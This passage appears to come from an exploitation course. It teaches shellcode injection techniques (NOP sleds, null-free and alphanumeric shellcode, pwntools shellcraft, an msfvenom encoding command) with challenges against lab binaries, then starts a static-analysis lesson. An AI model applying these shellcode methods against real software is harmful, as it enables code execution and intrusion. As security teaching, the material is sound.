there are a lot of things that could go wrong with the last two. For example, we cannot inject a shellcode in a process that doesn&rsquo;t read input or reads very little (though remember that if we can launch the target program we can place the shellcode inside its environment or command line arguments); we cannot trigger our shellcode if we cannot overwrite some code-pointer (e.g. a saved return) or if we do not know the precise address at which it ends up in the process&rsquo; memory and we cannot use such an attack if there isn&rsquo;t some memory region where we have both write and execute permissions.</p><p>Some of these hurdles can occur naturally, while others are intentionally created as preventive measures (e.g. on modern platforms, any memory area can be either writable or executable, but not both, a concept known as <a href=https://en.wikipedia.org/wiki/W%5EX>W^X</a>). Anyway, it is useful to think about these problems and how to work around them, then put that knowledge into practice.</p><h1 id=tutorials>Tutorials</h1><h2 id=01-tutorial-preventing-stack-operations-from-overwriting-the-shellcode>01. Tutorial: preventing stack operations from overwriting the shellcode</h2><p>When performing a shellcode attack we often needed to write some stuff in memory so that it has a valid address. For example, to perform an <code>execve("/bin/sh", ["/bin/sh", NULL], NULL)</code> syscall, we need to place the string <code>"/bin/sh"</code> in memory and fill the <code>rdi</code> register (first argument of a syscall) with that address. In theory we could write it in any writable area but, as you might have noticed in the previous session, it&rsquo;s usually simpler to just use the stack.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#000>rax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#a40000>`/</span><span style=color:#000>bin</span><span style=color:#a40000>/</span><span style=color:#000>sh</span><span style=color:#a40000>`</span>
</span></span><span style=display:flex><span>    <span style=color:#000>push</span> <span style=color:#000>rax</span>
</span></span></code></pre></div><p>results in fewer machine-code bytes than:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#000>rax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#a40000>`/</span><span style=color:#000>bin</span><span style=color:#a40000>/</span><span style=color:#000>sh</span><span style=color:#a40000>`</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#000>rbx</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0x00404000</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#000>qword</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>rbx</span><span style=color:#000;font-weight:700>],</span> <span style=color:#000>rax</span>
</span></span></code></pre></div><p>plus, <code>push</code>-ing has the side effect of placing our address in the <code>rsp</code> register which we could later <code>mov</code> somewhere else, avoiding the need of explicitly referring to some address (which might be difficult to predict, or even random, in the case of ASLR).</p><p>In cases where our shellcode is also injected on the stack this leads to the complicated situation in which the stack serves as both a code and data region. If we aren&rsquo;t careful, our data pushes might end up overwriting the injected code and ruining our attack.</p><p>Run <code>make</code> then use the <code>exploit.py</code> script (don&rsquo;t bother with how it works, for now); it will create a shellcode, pad it and feed it to the program, then open a new terminal window with a <code>gdb</code> instance breaked at the end of the <code>main</code> function. You can then explore what happens step by step and you will notice that, as the shellcode pushes the data it needs onto the stack it eventually comes to overwrite itself, resulting in some garbage.</p><p>The problem is that, after executing <code>ret</code> at the end of <code>main</code> and getting hijacked to jump to the beginning of our shellcode, <code>rip</code> ends up at <code>0x7ffca44f2280</code>, while <code>rsp</code> ends up at <code>0x7ffca44f22c0</code> (addresses on your machine will probably differ). The instruction pointer is only 64 bytes <strong>below</strong> the stack pointer.</p><ul><li>as instructions get executed, the instruction pointer is <em>incremented</em></li><li>as values are pushed onto the stack, the stack pointer is <em>decremented</em></li></ul><p>Thus the difference will shrink more and more with each instruction executed. The total length of the shellcode is 48 bytes so that means that after pushing 16 bytes onto the stack (64 - 48) any <code>push</code> will overwrite the end of our shellcode!</p><p>One obvious solution is to try and modify our shellcode to make it shorter, or to make it push less data onto the stack; this might work in some situations, but it&rsquo;s not a general fix.</p><p>Remember that after the vulnerable function returns, we control the execution of the program; so we can control what happens to the stack! Then we&rsquo;ll simply move the top of the stack to give us some space by adding this as the first instruction to our shellcode:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span>  <span style=color:#000>sub</span> <span style=color:#000>rsp</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>64</span>
</span></span></code></pre></div><p>Now, right after jumping to our shellcode, <code>rip</code> and <code>rsp</code> will be the same, but they&rsquo;ll go on in opposite directions and everything will be well. Uncomment line 64 in <code>exploit.py</code>, run it again and see what happens.</p><p>If we&rsquo;re at the very low-edge of the stack and can&rsquo;t access memory below, we can use <code>add</code> to move the stack pointer way up, so that even if the pushed data comes towards our injected code, it will not reach it; after all, our shellcode is short and we&rsquo;re not pushing much.</p><h2 id=02-tutorial-nop-sleds>02. Tutorial: NOP sleds</h2><p>In the previous session, you probably had some difficulties with the <a href=../shellcodes#09-challenge-shellcode-after-saved-ret---no-leak>ninth task</a>, which asked you to perform a shellcode-on-stack attack without having a leak of the overflown buffer&rsquo;s address. You can determine it using <code>gdb</code> but, as you&rsquo;ve seen, things differ between <code>gdb</code> and non-<code>gdb</code> environments; the problem is even worse if the target binary is running on a remote machine.</p><p>The crux of the issue is the fact that we have to precisely guess <strong>one</strong> exact address where our shellcode begins. For example, our shellcode might end up looking like this in memory:</p><pre tabindex=0><code>   0x7fffffffce28:  rex.WX adc QWORD PTR [rax+0x0],rax
   0x7fffffffce2c:  add    BYTE PTR [rax],al
   0x7fffffffce2e:  add    BYTE PTR [rax],al
=&gt; 0x7fffffffce30:  push   0x68
   0x7fffffffce32:  movabs rax,0x732f2f2f6e69622f
   0x7fffffffce3c:  push   rax
   0x7fffffffce3d:  mov    rdi,rsp
   0x7fffffffce40:  push   0x1016972
</code></pre><p>The first instruction of our shellcode is the <code>push 0x68</code> at address <code>0x7fffffffce30</code>:</p><ul><li>if we jump before it, we&rsquo;ll execute some garbage interpreted as code; in the above example, missing it by two bytes would execute <code>add BYTE PTR [rax],al</code> which might SEGFAULT if <code>rax</code> doesn&rsquo;t happen to hold a valid writable address</li><li>if we jump after it, we&rsquo;ll have a malformed <code>"/bin/sh"</code> string on the stack, so the later <code>execve</code> call will not work.</li></ul><p>Fortunately, we don&rsquo;t have to consider the entire address space, so our chances are better than 1 in 2<sup>64</sup>:</p><ul><li>the stack is usually placed at a fixed address (e.g. 0x7fffffffdd000), so we have a known-prefix several octets wide</li><li>due to alignment concerns, the compiler emits code that places buffers and other local data at nice, rounded addresses (ending in <code>0</code>, or <code>c0</code>, <code>00</code> etc.), so we have a known-suffix several bits wide</li></ul><p>On your local machine, using <code>gdb</code> to look at the buffer&rsquo;s address will then allow you to use just a bit of bruteforce search to determine the address outside of <code>gdb</code>.</p><p>But what if we could increase our chances to jump to the beginning of our shellcode? So that we don&rsquo;t have to guess <strong>one</strong> exact address, but just hit some address range? This is where &ldquo;NOP sleds&rdquo; come in.</p><p>A &ldquo;NOP sled&rdquo; is simply a string of <code>NOP</code> instructions added as a prefix to a shellcode. The salient features of a <code>NOP</code> instruction that make it useful for us are:</p><ul><li>it does nothing</li><li>it&rsquo;s one byte long</li></ul><p>Thus if we chain a bunch of these together and prepend them to our shellcode, we can jump inside the middle of the &ldquo;NOP sled&rdquo; at any position and it will be alright: each subsequent <code>NOP</code> instruction will be executed, doing nothing, then our shellcode will be reached.</p><p>Our shellcode will end up looking like this in the process memory:</p><pre tabindex=0><code>   0x7fffffffd427:  mov BYTE PTR [rax], al
   0x7fffffffd429:  nop
   0x7fffffffd42a:  nop
   0x7fffffffd42b:  nop
   0x7fffffffd42c:  nop
   0x7fffffffd42d:  nop
   0x7fffffffd42e:  nop
   0x7fffffffd42f:  nop
=&gt; 0x7fffffffd430:  push   0x68
   0x7fffffffd432:  movabs rax,0x732f2f2f6e69622f
   0x7fffffffd43c:  push   rax
</code></pre><p>Again, our first &ldquo;useful&rdquo; instruction is the <code>push 0x68</code> at <code>0x7fffffffd430</code>. Jumping after it and skipping its execution is still problematic, but notice that we can now jump <strong>before</strong> it, missing it by several bytes with no issue. If we jump to <code>0x7fffffffd42c</code> for example, we&rsquo;ll reach a <code>nop</code>, then execution will pass on to the next <code>nop</code> and so on; after executing 4 nops, our shellcode will be reached and everything will be as if we had jumped directly to <code>0x7fffffffd430</code> in the first place. There is now a continuous range of 8 addresses where it&rsquo;s ok to jump to.</p><p>But 8 is such a small number; the longer the NOP sled, the better our chances. The only limit is how much data we can feed into the program when we inject our shellcode.</p><ul><li>Run <code>make</code>, then inspect the <code>vuln</code> binary in <code>gdb</code> and determine the location of the vulnerable buffer.</li><li>Modify line 14 of the <code>exploit.py</code> script with the address you&rsquo;ve found, then run the script. Most likely, it will not work: the address outside of <code>gdb</code> is different.</li><li>Uncomment line 17 of the script, then run it again.</li><li>You should now have a shell!</li></ul><p>If this doesn&rsquo;t work, play a bit with the address left on line 14; increment it by 256, then decrement it by 256. You&rsquo;re aiming to get <strong>below</strong> the actual address at some offset smaller than the NOP sled length which, in this example, is 1536.</p><h2 id=03-tutorial-null-free-shellcodes>03. Tutorial: null-free shellcodes</h2><p>Up until now, all the vulnerable programs attacked used <code>read</code> as a method of getting the input. This allows us to feed them any string of arbitrary bytes. In practice, however, there are many cases in which the input is treated as a 0-terminated <em>string</em> and processed by functions like <code>strcpy</code>.</p><p>This means that our shellcode cannot contain a 0 byte because, as far as functions like <code>strcpy</code> are concerned, that signals the end of the input. However, shellcodes are likely to contain 0 bytes. For example, remember that we need to set <code>rax</code> to a value indicating the syscall we want; if we wish to <code>execve</code> a new shell, we&rsquo;ll have to place the value <code>59</code> in <code>rax</code>:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span>  <span style=color:#000>mov</span> <span style=color:#000>rax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0x3b</span>
</span></span></code></pre></div><p>Due to the nature of x86 instructions and the size of the <code>rax</code> register, that <code>0x3b</code> might be considered an 8-byte wide constant, yielding the following machine code: <code>48 b8 59 00 00 00 00 00 00 00</code>.</p><p>As you can see, there are quite a lot of zeroes. We could get rid of them if we considered <code>0x3b</code> to be a 1-byte wide constant; unfortunately there&rsquo;s no instruction to place into <code>rax</code> an immediate 1-byte value. However, there is an instruction to place an immediate 1-byte value in <code>al</code>, the lowest octet of <code>rax</code>. But we need the other seven octets to be 0&mldr; Fortunately, we can do a trick by xor-ing the register with itself! This will make every bit 0, plus the <code>xor</code> instruction itself doesn&rsquo;t contain 0 bytes. So we can replace the code above with:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span>  <span style=color:#000>xor</span> <span style=color:#000>rax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>rax</span>
</span></span><span style=display:flex><span>  <span style=color:#000>mov</span> <span style=color:#000>al</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0x3b</span>
</span></span></code></pre></div><p>Which assembles to <code>48 31 c0 b0 3b</code>. Not only are there no 0 bytes, we&rsquo;ve also reduced the size of the code!</p><p>Takeaways:</p><ul><li>xor-ing a register with itself is a good way of obtaining some zeroes in memory without using zeroes in machine code</li><li>working with the lower parts of registers avoids immediate values with leading-zeroes</li></ul><p>We can apply these insights in other situations to avoid zeroes in our code. For example, instead of</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#000>rax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#a40000>`/</span><span style=color:#000>bin</span><span style=color:#a40000>/</span><span style=color:#000>sh</span><span style=color:#a40000>\</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#a40000>`</span>
</span></span><span style=display:flex><span>    <span style=color:#000>push</span> <span style=color:#000>rax</span>
</span></span></code></pre></div><p>We can write:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span>    <span style=color:#000>xor</span> <span style=color:#000>rax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>rax</span>
</span></span><span style=display:flex><span>    <span style=color:#000>push</span> <span style=color:#000>rax</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#000>rax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#a40000>`//</span><span style=color:#000>bin</span><span style=color:#a40000>/</span><span style=color:#000>sh</span><span style=color:#a40000>`</span>
</span></span><span style=display:flex><span>    <span style=color:#000>push</span> <span style=color:#000>rax</span>
</span></span></code></pre></div><p>Note that extra-slashes in a path don&rsquo;t make any difference.</p><p>The <code>vuln.c</code> program reads data properly into a buffer, then uses <code>strcpy</code> to move data into a smaller buffer, resulting in an overflow. Run <code>make</code>, then the <code>exploit.py</code> script; just like before, it will start a new terminal window with a <code>gdb</code> instance in which you can explore what happens. The attack will fail because the injected shellcode contains 0 bytes so <code>strcpy</code> will only stop copying well before the end of the shellcode.</p><p>Comment line 55 and uncomment line 56, replacing the shellcode with a null-free version. Run <code>exploit.py</code> again. It should work!</p><h2 id=04-tutorial-shellcodes-in-pwntools>04. Tutorial: shellcodes in pwntools</h2><p>Once again, <code>pwntools</code> can come to our aid and help us with shellcode attacks. The most useful feature for this is the <a href=https://docs.pwntools.com/en/stable/shellcraft.html>shellcraft module</a> which offers prebuilt shellcodes for various architectures.</p><p>For example, to obtain a shellcode which performs <code>execve("/bin/sh", {"/bin/sh", NULL}, NULL)</code> on an <code>x86_64</code> platform we can call:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>shellcraft</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>amd64</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>linux</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>sh</span><span style=color:#000;font-weight:700>()</span>
</span></span></code></pre></div><p>Note that this will give you back text representing <em>assembly code</em> and <strong>not</strong> <em>machine code</em> bytes. You can then use the <code>asm</code> function to assemble it:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>asm</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>shellcraft</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>amd64</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>linux</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>sh</span><span style=color:#000;font-weight:700>(),</span> <span style=color:#000>arch</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#34;amd64&#34;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>os</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#34;linux&#34;</span><span style=color:#000;font-weight:700>))</span>
</span></span></code></pre></div><p>Remember the friendly features of pwntools! Instead of always specifying the OS and the architecture, we can set them in the global context, like this:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>context</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>arch</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#34;amd64&#34;</span>
</span></span><span style=display:flex><span><span style=color:#000>context</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>os</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#34;linux&#34;</span>
</span></span></code></pre></div><p>Or - even simpler - we can indicate a particular binary and let pwntools deduce the OS and architecture: <code>context.binary = "./vuln"</code>. We can then invoke a much cleaner <code>asm(shellcraft.sh())</code>.</p><p>Besides the magic snippet to invoke a shell, there are other builtin code fragments, such as to cause a crash, an infinite loop, <code>cat</code> a file or call some other syscall. Play around with <code>shellcraft</code>, inspecting the output. You&rsquo;ll notice that all these shellcodes are free of zero bytes and newlines!</p><h2 id=05-tutorial-alphanumeric-shellcode>05. Tutorial: alphanumeric shellcode</h2><p>It is commonly the case that user input is filtered to make sure it matches certain conditions. Most user input expected from a keyboard should not contain non-printable characters; a &ldquo;name&rdquo; should contain only letters, a PIN should contain only digits, etc.</p><p>The program might check its input against some conditions and, if rejected, bail in such a way so as to not trigger our injected code. This places the burden on us to develop shellcode that doesn&rsquo;t contain certain bytes. We&rsquo;ve seen how we can avoid newlines and zero bytes to work around some input-reading functions. This concept can be pushed even further, heavily restricting our character set: on 32-bit platforms, we can write <strong>alphanumeric shellcodes</strong>!</p><p>But can we really? It&rsquo;s plausible that there are some clever tricks on the level of replacing <code>mov eax, 0x3b</code> with <code>xor eax, eax; mov al, 0x3b</code> that could make use of only alphanumeric characters, but all our shellcodes so far need to perform a syscall. Looking at the encoding of the <code>int 0x80</code> instruction seems pretty grim: <code>\xcd\x80</code>. Those are not even printable characters. So how can we perform a syscall?</p><p>Here it&rsquo;s important to step back and carefully consider our assumptions:</p><ul><li>There is some memory region to which we have both write and execute access (otherwise we wouldn&rsquo;t attempt a code injection attack)</li><li>After our input is read, there is some check on it to make sure it doesn&rsquo;t contain certain characters.</li></ul><p>Aha! We cannot <strong>inject</strong> some bytes, but nothing&rsquo;s stopping us from injecting something that <strong>generates</strong> those bytes! Generating is just an alternative way of <em>writing</em>, so instead of <strong>injecting</strong> our shellcode, we&rsquo;ll inject some code which <strong>generates</strong> the shellcode, then executes it!</p><p>This is, in fact, as complicated as it sounds, so we won&rsquo;t do it ourselves. We&rsquo;ll just observe how such a shellcode, produced by a specialized tool (<code>msfvenom</code>) works. So invoke the following command, which should give you a python-syntax buffer containing an alphanumeric shellcode that executes &ldquo;/bin/sh&rdquo;:</p><p><code>msfvenom -a x86 --platform linux -p linux/x86/exec -e x86/alpha_mixed BufferRegister=ECX -f python</code></p><ul><li><code>-a x86</code>: specifies the architecture as 32-bit x86</li><li><code>--platform linux</code>: specifies OS</li><li><code>-p linux/x86/exec</code>: specifies a preset program (you can use <code>-</code> or <code>STDIN</code> for a custom initial shellcode, to be transformed)</li><li><code>-e x86/alpha_mixed</code>: specifies encoding to be alphanumeric</li><li><code>BufferRegister=ECX</code>: specifies an initial register which holds the address of the buffer; this is needed in order to have some way to refer to the region in which we&rsquo;re unpacking our code. Without this, a short non-alphanumeric preamble is added instead to automatically extract the buffer address</li><li><code>-f python</code>: formats output using python syntax</li></ul><p><code>msfvenom</code> is actually capable of taking an arbitrary assembly snippet and transforming it into an alphanumeric &ldquo;bootstrapper&rdquo; which, once injected, unpacks the original shellcode and executes it.</p><h1 id=challenges>Challenges</h1><h2 id=06-challenge-nop-sled-redo>06. Challenge: NOP sled redo</h2><p>Redo the last three challenges (9, 10, 11) from <a href=../shellcodes>the previous session</a> using NOP-sleds.</p><h2 id=07-challenge-no-nops-allowed>07. Challenge: No NOPs allowed!</h2><p>This is similar to the previous tasks: you are left to guess a stack address. However, the <code>\x90</code> byte is filtered from input so you cannot use a NOP sled. But you should be able to adapt the concept. Remember the relevant features of the &ldquo;NOP&rdquo; instruction!</p><h2 id=08-challenge-multiline-output>08. Challenge: multiline output</h2><p>While perfectly ok with the byte 0, some functions (e.g. <code>fgets</code>) will stop reading when they encounter a newline character (<code>\n</code>). Thus, if our input is read by such a function, we need to make sure our shellcode contains no <code>\n</code> bytes.</p><p>For this challenge, the input will be read using the <code>gets</code> function, but you will need to craft a shellcode which prints to <code>stdout</code> the exact string:</p><pre tabindex=0><code>first
second
third
</code></pre><h2 id=09-challenge-execve-blocking-attempt>09: Challenge: <code>execve</code> blocking attempt</h2><p>If shellcodes are such a powerful threat, what if we attempted to block some shellcode-sepcific characters? Such as the bytes that encode a <code>syscall</code> function. Or the slash needed in a path; maybe it&rsquo;s not such a big loss to avoid these in legitimate inputs.</p><p>Can you still get a shell? For this task, <strong>don&rsquo;t use</strong> an existing encoder, but rather apply the encoding principles yourself.</p><h1 id=further-reading>Further Reading</h1><p><a href=http://phrack.org/issues/49/14.html>&ldquo;Smashing The Stack For Fun And Profit&rdquo;, Aleph One</a> - a legendary attack paper documenting SBOs and shellcodes. As it is written in &lsquo;96, the examples in it will probably <em>not</em> work (either out-of-the-box or with some tweaks). We recommend perusing it for its historical/cultural significance, but don&rsquo;t waste much time on the technical details of the examples.</p><h2 id=input-restrictions>Input restrictions</h2><p>The following articles deal with restrictions on the shellcode structure, such as forbidden characters or statistical properties of the input string. The examples presented will most likely not work as-they-are in a modern environment, so don&rsquo;t focus on the technical details, but rather on the methodology presented.</p><p><a href=http://phrack.org/issues/57/15.html><em>Writing ia32 alphanumeric shellcodes</em>, 2001 - rix</a> - probably the first comprehensive presentation of how to automatically convert generic shellcodes to alphanumeric ones.</p><p><a href=http://phrack.org/issues/61/11.html><em>Building IA32 &lsquo;Unicode-Proof&rsquo; Shellcodes</em>, 2003 - obscou</a> - rather than being concerned with input <em>restrictions</em>, this addresses ulterior transformations on input, namely converting an ASCII string to a UTF-16 one (as mentioned in the article&rsquo;s introduction, you could also imagine other possible transformations, such as case normalization).</p><p><a href=http://phrack.org/issues/62/9.html><em>Writing UTF-8 compatible shellcodes</em>, 2004 - Wana</a></p><p><a href=https://www.cs.jhu.edu/~sam/ccs243-mason.pdf><em>English shellcode</em>, 2009 - Mason, Small, Monrose, MacManus</a> - delves into automatically generating shellcode which has the same statistical properties as English text.</p></div><div class=td-content style=page-break-before:always><h1 id=pg-4819e36a57703dede7da6f4fb2a329e6>11 -</h1><h1 id=table-of-contents>Table of Contents</h1><ul><li><a href=#introduction>Introduction</a></li><li><a href=#disassembling-executables>Disassembling executables</a><ul><li><a href=#linear-sweep>Linear Sweep</a></li><li><a href=#recursive-traversal>Recursive Traversal</a></li></ul></li><li><a href=#ida-and-ghidra>IDA and Ghidra</a><ul><li><a href=#ida-tips--tricks>IDA tips & tricks</a></li><li><a href=#ida-pro-and-ghidra>IDA Pro and Ghidra</a></li></ul></li><li><a href=#c>C++</a></li><li><a href=#further-reading>Further reading</a></li><li><a href=#challenges>Challenges</a><ul><li><a href=#04-crypto_crackme>04. crypto_crackme</a></li><li><a href=#05-broken>05. broken</a></li><li><a href=#06-hyp3rs3rv3r>06. hyp3rs3rv3r</a></li></ul></li></ul><h1 id=introduction>Introduction</h1><p>Sometimes we are either unable or reluctant to run an unknown executable. This inability to run the file can be caused by a multitude of factors, such as not having the correct dependencies or runtimes for it. In addition, it is often unsafe to run binaries without analysing them first. Today we&rsquo;ll learn about one method of analysis, called <strong>static analysis</strong>.</p><p>Thus, static analysis allows us to understand the behaviour of the application by displaying either its assembly code or an equivalent high-level code. In order to obtain the assembly code, via a procedure called <strong>disassembling</strong>, currently there are two approaches being used, which we&rsquo;ll describe in the following sections. The high-level code, is <em>deduced</em> from the machine code, through a more complex process called <strong>decompilation</strong>, which sometimes might make it a bit inaccurate, when compared to the assembly code.</p><h1 id=disassembling-executables>Disassembling executables</h1><p>There are two main strategies when it comes to disassembly. They are called <strong>Linear Sweep</strong> and <strong>Recursive Traversal</strong>. As we&rsquo;ll see below, the main difference between the two is their accuracy</p><h2 id=linear-sweep>Linear Sweep</h2><p>The first strategy that we&rsquo;ll look at is <em>Linear Sweep</em>. A very popular tool that uses this strategy is <code>objdump</code>. What <em>Linear Sweep</em> does is it parses the <code>.text</code> section of the executable from the beginning to the end and translates each encountered machine code instruction into its equivalent Assembly instruction. It&rsquo;s a fast and simple algorithm. Being so simple, however, renders it vulnerable to being mislead. This can happen in a few ways. One way is to insert an inappropriate instruction somewhere in the <code>.text</code> section. When the algorithm reaches it, it will try to interpret it as something meaningful and output a completely different Assembly code that would make no sense.</p><p>Let&rsquo;s consider the code below, which is also available <a href=https://github.com/hexcellents/sss-exploit/blob/master/sessions/04-static-analysis/activities/01-tutorial-disassemble-methods/src/wrong.c>in this repo</a>:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>asm</span> <span style=color:#204a87;font-weight:700>volatile</span><span style=color:#000;font-weight:700>(</span>
</span></span><span style=display:flex><span>		<span style=color:#4e9a06>&#34;A: jmp B</span><span style=color:#4e9a06>\n\t</span><span style=color:#4e9a06>&#34;</span>
</span></span><span style=display:flex><span>		<span style=color:#4e9a06>&#34;.byte 0xde</span><span style=color:#4e9a06>\n\t</span><span style=color:#4e9a06>&#34;</span>
</span></span><span style=display:flex><span>		<span style=color:#4e9a06>&#34;.byte 0xad</span><span style=color:#4e9a06>\n\t</span><span style=color:#4e9a06>&#34;</span>
</span></span><span style=display:flex><span>		<span style=color:#4e9a06>&#34;.byte 0xc0</span><span style=color:#4e9a06>\n\t</span><span style=color:#4e9a06>&#34;</span>
</span></span><span style=display:flex><span>		<span style=color:#4e9a06>&#34;.byte 0xde</span><span style=color:#4e9a06>\n\t</span><span style=color:#4e9a06>&#34;</span>
</span></span><span style=display:flex><span>		<span style=color:#4e9a06>&#34;jmp -1</span><span style=color:#4e9a06>\n\t</span><span style=color:#4e9a06>&#34;</span>
</span></span><span style=display:flex><span>		<span style=color:#4e9a06>&#34;B:</span><span style=color:#4e9a06>\n\t</span><span style=color:#4e9a06>&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#000>printf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;What is wrong with me :-s?</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>Take a look at the Makefile rule for <code>wrong</code> and notice that it <strong>strips</strong> the binary:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-makefile data-lang=makefile><span style=display:flex><span><span style=color:#000>wrong</span><span style=color:#ce5c00;font-weight:700>:</span> <span style=color:#000>wrong</span>.<span style=color:#000>o</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>$(</span>CC<span style=color:#204a87;font-weight:700>)</span> <span style=color:#204a87;font-weight:700>$(</span>CFLAGS<span style=color:#204a87;font-weight:700>)</span> $&lt; -o <span style=color:#000>$@</span>
</span></span><span style=display:flex><span>	-strip <span style=color:#000>$@</span>
</span></span></code></pre></div><p>If we remove the line at the end of the snipped above and then disassemble the executable, we can see our inline assembly code (<code>de ad c0 de</code>) together with the encoding of <code>jmp -1</code>. The binary code is as expected, but the way it&rsquo;s interpreted is completely off. This happens because <em>objdump</em> gets &ldquo;confused&rdquo; when reaching the bytes <code>de ad c0 de</code> and can&rsquo;t figure out that that code is meaningless.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a40000>080491</span><span style=color:#000>ab</span> <span style=color:#a40000>&lt;</span><span style=color:#000>A</span><span style=color:#a40000>&gt;</span><span style=color:#000;font-weight:700>:</span>
</span></span><span style=display:flex><span> <span style=color:#a40000>80491</span><span style=color:#f57900>ab:</span>       <span style=color:#000>eb</span> <span style=color:#0000cf;font-weight:700>09</span>                   <span style=color:#000>jmp</span>    <span style=color:#0000cf;font-weight:700>80491b6</span> <span style=color:#000;font-weight:700>&lt;</span><span style=color:#000>B</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span> <span style=color:#a40000>80491</span><span style=color:#f57900>ad:</span>       <span style=color:#000>de</span> <span style=color:#000>ad</span> <span style=color:#000>c0</span> <span style=color:#000>de</span> <span style=color:#000>e9</span> <span style=color:#0000cf;font-weight:700>49</span>       <span style=color:#000>fisubr</span> <span style=color:#000>WORD</span> <span style=color:#000>PTR</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>ebp</span><span style=color:#a40000>+</span><span style=color:#0000cf;font-weight:700>0x49e9dec0</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span> <span style=color:#a40000>80491</span><span style=color:#f57900>b3:</span>       <span style=color:#a40000>6</span><span style=color:#000>e</span>                      <span style=color:#000>outs</span>   <span style=color:#000>dx</span><span style=color:#000;font-weight:700>,</span><span style=color:#000>BYTE</span> <span style=color:#000>PTR</span> <span style=color:#000>ds</span><span style=color:#000;font-weight:700>:[</span><span style=color:#000>esi</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span> <span style=color:#a40000>80491</span><span style=color:#f57900>b4:</span>       <span style=color:#000>fb</span>                      <span style=color:#000>sti</span>    
